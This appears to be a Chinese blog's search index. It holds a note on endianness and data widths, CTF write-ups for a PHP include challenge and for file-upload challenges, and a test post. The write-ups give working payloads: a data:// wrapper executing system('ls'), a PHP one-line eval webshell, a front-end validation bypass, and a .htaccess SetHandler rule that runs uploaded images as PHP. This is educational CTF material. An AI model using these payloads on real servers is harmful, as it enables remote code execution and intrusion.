+<p><strong>注</strong>：同类型数据并不是所有机器都采用相同的宽度，分配的字节数险随ISA、机器字长和编译器的不同而不同。<br>例如，ANSI C标准未规定long double的确切精度，所以对于不同平台有不同的实现。有的是8字节，有的是10字节，有的是12字节或16字节。</p>
+<h2 id="数据的储存和排列顺序"><a href="#数据的储存和排列顺序" class="headerlink" title="数据的储存和排列顺序"></a>数据的储存和排列顺序</h2><h3 id="存放顺序"><a href="#存放顺序" class="headerlink" title="存放顺序"></a>存放顺序</h3><h4 id="大端方式"><a href="#大端方式" class="headerlink" title="大端方式"></a>大端方式</h4><p>最高有效字节放在地址起点，即MSB为访问地址</p>
+<h4 id="小端方式"><a href="#小端方式" class="headerlink" title="小端方式"></a>小端方式</h4><p>最低有效字节放在地址起点，即LSB为访问地址</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2022/07/202207182305076.png"
+                      alt="image-20220718230541035"
+                ></p>
+]]></content>
+      <tags>
+        <tag>学习笔记</tag>
+        <tag>计算机系统</tag>
+        <tag>大端</tag>
+        <tag>小端</tag>
+        <tag>数据宽度</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[攻防世界]Web_php_include</title>
+    <url>/2021/09/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb_php_include/</url>
+    <content><![CDATA[<h2 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源:"></a><strong>题目来源:</strong></h2><p><a class="link"   href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5415&page=1" >攻防世界&gt;&gt;答题&gt;&gt;Web&gt;&gt;高手进阶区&gt;&gt;Web_php_include <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识:"></a><strong>前置知识:</strong></h2><p>PHP include()与php伪协议: <a class="link"   href="https://segmentfault.com/a/1190000018991087" >PHP伪协议总结 - SegmentFault 思否 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>PHP strstr(): <code>strstr(string $haystack, [mixed](https://www.php.net/manual/zh/language.types.declarations.php#language.types.declarations.mixed) $needle, bool $before_needle = false)</code>查找$needle在$haystack中的首次出现,返回值为字符串或0(未查找到结果)。 [su_highlight]注意该函数区分大小写[&#x2F;su_highlight] 。 <a class="link"   href="https://www.php.net/manual/zh/function.strstr.php" >详细文档&gt;&gt; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>PHP str_replace(): 字符串替换。<a class="link"   href="https://www.php.net/manual/zh/function.str-replace.php" >详细文档&gt;&gt; <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp:"></a><strong>WriteUp:</strong></h2><p>打开链接访问网页,发现显示以下代码:</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>分析代码:</p>
+<p>通过GET请求发送<code>hello</code>和<code>page</code>给服务器,<code>hello</code>会被<code>echo</code>语句输出出来,<code>page</code>会传给<code>$page</code>变量,<code>$page</code>变量中的<code>php://</code> 被过滤掉后传到<code>include($page);</code>语句当中。</p>
+<p>首先我们先扫描常用的php页面:</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blogcdn.txg2333.top/wp-content/uploads/2021/09/image.png"
+                      alt="001"
+                ></p>
+<p>发现可以访问phpinfo.php,因为可以通过GET请求控制<code>include($page)</code>这个语句的执行内容,因此猜想可以通过伪协议来执行php语句,前往phpinfo.php页面查看是否满足条件:</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blogcdn.txg2333.top/wp-content/uploads/2021/09/image-1-1024x245.png"
+                      alt="002"
+                ></p>
+<p>发现<code>allow_url_fopen</code>与 <code>allow_url_ include</code>的值都为on,满足伪协议的条件。</p>
+<p>这里我选择了date:&#x2F;&#x2F;这个伪协议</p>
+<p>date:&#x2F;&#x2F;伪协议的用法:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">data://text/plain,&lt;语句&gt;</span><br><span class="line">data://text/plain,base64,&lt;语句(需base64加密)&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>构造<code>?page=data://text/plain,&lt;?php system(&quot;ls&quot;);?&gt;</code>的GET请求(注意URL转码)发送:</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blogcdn.txg2333.top/wp-content/uploads/2021/09/image-2.png"
+                      alt="003"
+                ></p>
+<p>发现fl4gisisish3r3.php文件,再次构造<code>?page=data://text/plain,&lt;?php show_source(&quot;fl4gisisish3r3.php&quot;)?&gt;</code>输出该文件的源码</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blogcdn.txg2333.top/wp-content/uploads/2021/09/image-3-1024x595.png"
+                      alt="004"
+                ></p>
+<p>得到flag(注意:若使用cat fl4gisisish3r3.php的方式查看flag需要在网页源代码里才能看到,页面不直接显示)</p>
+<hr>
+<p>做这道题时我还有一些其他思路,比如利用strstr()大小写敏感来防止php:&#x2F;&#x2F;伪协议被过滤。而且我感觉hello这个GET请求应该也可以利用拿到flag,不过目前我对php的了解还不够多,想不到什么办法,不过网上有很多dalao利用了这个hello。这次就先写这一个方法吧,有空研究研究继续写</p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Web</tag>
+        <tag>WriteUp</tag>
+        <tag>Medium</tag>
+        <tag>PHP</tag>
+        <tag>攻防世界</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[题型总结 &amp; CTFHub]上传文件</title>
+    <url>/2021/10/05/%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93-ctfhub%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p>通过一些手段绕过拦截验证机制上传一句话木马文件(Webshell)到目标服务器并且能成功访问它,然后向其发送请求执行我们要执行的命令.</p>
+<h6 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h6><ul>
+<li>能够将木马成功上传到目标服务器</li>
+<li>能够找到上传的木马文件,并成功访问</li>
+<li>一句话木马中的函数能够成功运行</li>
+</ul>
+<h6 id="一句话木马示例"><a href="#一句话木马示例" class="headerlink" title="一句话木马示例"></a>一句话木马示例</h6><p>以PHP为例: <code>&lt;?php @eval($_POST(&quot;shell&quot;)); ?&gt;</code> (@的作用是不显示错误信息,以免被人发现)</p>
+<h2 id="CTFHub技能树中例题"><a href="#CTFHub技能树中例题" class="headerlink" title="CTFHub技能树中例题"></a>CTFHub技能树中例题</h2><h3 id="无验证"><a href="#无验证" class="headerlink" title="无验证"></a>无验证</h3><p>直接上传一句话木马即可</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-2.png"
+                      alt="001"
+                ></p>
+<p>bebebe</p>
+<p>访问该文件并通过POST请求发送命令</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-3.png"
+                      alt="002"
+                ></p>
+<p>经过列出目录命令发现在..&#x2F;里有flag_301433253.php文件</p>
+<p>通过show_source()函数输出flag_301433253.php的内容获取flag</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-4.png"
+                      alt="003"
+                ></p>
+<p>后面几个例题就主要说说怎么绕过验证</p>
+<h3 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h3><p>打开题目所给链接,查看元素发现以下javascript代码:</p>
+<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">function</span> <span class="title function_">checkfilesuffix</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> file=<span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;file&#x27;</span>)[<span class="number">0</span>][<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(file==<span class="string">&quot;&quot;</span>||file==<span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;请添加上传文件&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> whitelist=<span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&quot;.jpg&quot;</span>,<span class="string">&quot;.png&quot;</span>,<span class="string">&quot;.gif&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> file_suffix=file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span>(whitelist.<span class="title function_">indexOf</span>(file_suffix) == -<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;该文件不允许上传&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>
+
+<p>这段函数的作用是判断文件后缀名是否为<code>.jpg</code> <code>.png</code> <code>.gif</code> , 不是的话返回<code>false</code>上传失败. 不过好在这个验证程序是写在前端的,我们可以在前端直接对这段函数进行操作.</p>
+<p>我们将这段函数中 <code>alert(&quot;该文件不允许上传&quot;);</code> 后的<code>return false;</code> 改成<code>return true;</code> ,然后复制修改过后的函数到控制台回车运行,如图:</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-5.png"
+                      alt="005"
+                ></p>
+<p>然后上传我们的一句话木马,在弹出”该文件不允许上传”后又会弹出”上传成功”.</p>
+<h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p>打开题目所给链接,查看元素发现以下被注释掉的javascript代码,根据题目猜想是目标服务器通过.htaccess实现了下列函数的功能</p>
+<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_">empty</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    $name = <span class="title function_">basename</span>($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    $ext = <span class="title function_">pathinfo</span>($name)[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">    $blacklist = <span class="title function_">array</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;php7&quot;</span>, <span class="string">&quot;php5&quot;</span>, <span class="string">&quot;php4&quot;</span>, <span class="string">&quot;php3&quot;</span>, <span class="string">&quot;phtml&quot;</span>, <span class="string">&quot;pht&quot;</span>, <span class="string">&quot;jsp&quot;</span>, <span class="string">&quot;jspa&quot;</span>, <span class="string">&quot;jspx&quot;</span>, <span class="string">&quot;jsw&quot;</span>, <span class="string">&quot;jsv&quot;</span>, <span class="string">&quot;jspf&quot;</span>, <span class="string">&quot;jtml&quot;</span>, <span class="string">&quot;asp&quot;</span>, <span class="string">&quot;aspx&quot;</span>, <span class="string">&quot;asa&quot;</span>, <span class="string">&quot;asax&quot;</span>, <span class="string">&quot;ascx&quot;</span>, <span class="string">&quot;ashx&quot;</span>, <span class="string">&quot;asmx&quot;</span>, <span class="string">&quot;cer&quot;</span>, <span class="string">&quot;swf&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_">in_array</span>($ext, $blacklist)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">move_uploaded_file</span>($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable constant_">UPLOAD_PATH</span> . $name)) &#123;</span><br><span class="line">            echo <span class="string">&quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            echo <span class="string">&quot;上传文件相对路径&lt;br&gt;&quot;</span> . <span class="variable constant_">UPLOAD_URL_PATH</span> . $name;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            echo <span class="string">&quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        echo <span class="string">&quot;&lt;script&gt;alert(&#x27;文件类型不匹配&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>函数功能是判断文件后缀名是否在黑名单中,在就输出”文件类型不匹配”.</p>
+<p>做这道题我们首先要了解Apache的<a class="link"   href="https://httpd.apache.org/docs/2.4/mod/core.html#sethandler" >Sethandler指令 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ,将其写入到.htaccess文件里可以将匹配到的文件强制使用另一种处理程序处理. 简单来说就是可以把一种文件强制当作另一种文件. 例如本题将使用的绕过代码:</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">shell.jpg</span>&quot;&gt;</span>  </span><br><span class="line">        SetHandler application/x-httpd-php  </span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>这段代码放进.htaccess中可将shell.jpg这个文件当作php文件处理.</p>
+<p>好了,接下来让我们进行绕过工作</p>
+<ol>
+<li>将写好的PHP一句话木马的后缀名改成JPG或者其他允许的文件类型</li>
+<li>创建一个.htaccess的文件(因为Windows不允许创建名字为空的文件,因此具体创建方法可以自行到网上搜索),将以上绕过代码填入其中,保存并上传,因为黑名单中没有.htaccess,可以直接上传.</li>
+<li>最后直接访问<a class="link"   href="http://xxxxx.com/upload/shell.jpg%E8%80%81%E5%A5%97%E8%B7%AF%E5%8D%B3%E5%8F%AF(%E9%93%BE%E6%8E%A5%E5%8F%8A%E6%96%87%E4%BB%B6%E5%90%8D%E6%A0%B9%E6%8D%AE%E8%87%AA%E5%B7%B1%E6%83%85%E5%86%B5%E4%BF%AE%E6%94%B9)" >http://xxxxx.com/upload/shell.jpg老套路即可(链接及文件名根据自己情况修改) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ol>
+<p>目前先写到这,还有几道题有时间再写^ ^</p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>CTFHub</tag>
+        <tag>PHP</tag>
+        <tag>.htaccess</tag>
+        <tag>一句话木马</tag>
+        <tag>前端验证</tag>
+        <tag>文件上传</tag>
+        <tag>无验证</tag>
+        <tag>题型总结</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>测试vercel</title>
+    <url>/2023/10/21/test/</url>
+    <content><![CDATA[<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>使用 vercel 进行静态网页托管.</p>
+]]></content>
+  </entry>
+</search>
